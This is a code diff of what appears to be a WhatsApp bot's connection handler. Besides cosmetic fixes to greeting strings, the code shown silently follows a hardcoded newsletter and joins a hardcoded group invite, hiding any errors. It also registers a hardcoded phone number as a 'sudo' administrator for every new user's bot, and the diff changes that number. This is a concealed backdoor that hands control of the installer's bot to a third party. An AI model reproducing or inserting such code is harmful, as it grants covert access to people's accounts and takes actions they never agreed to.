@@ -13,9 +13,9 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
   function getGreeting() {
     const hour = DateTime.now().setZone("Africa/Nairobi").hour;
     if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
-    if (hour >= 12 && hour < 18) return "What’s up? Time to make things happen! ⚡";
-    if (hour >= 18 && hour < 22) return "Evening vibes! Let’s get to it! 🌟";
-    return "Late night? Let’s see what’s cooking! 🌙";
+    if (hour >= 12 && hour < 18) return "What's up? Time to make things happen! ⚡";
+    if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it! 🌟";
+    return "Late night? Let's see what's cooking! 🌙";
   }
 
   function getCurrentTime() {
@@ -83,8 +83,6 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
         await socket.newsletterFollow("120363400480173280@newsletter");
         await socket.groupAcceptInvite("LfTFxkUQ1H7Eg2D0vR3n6g");
     } catch {}
-}
-
 
     const userId = socket.user.id.split(":")[0].split("@")[0];
     const settings = await getSettings();
@@ -94,7 +92,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
       const isNewUser = !sudoUsers.includes(userId);
       if (isNewUser) {
         await addSudoUser(userId);
-        const defaultSudo = "254735342808";
+        const defaultSudo = "254104260236";
         if (!sudoUsers.includes(defaultSudo)) {
           await addSudoUser(defaultSudo);
         }
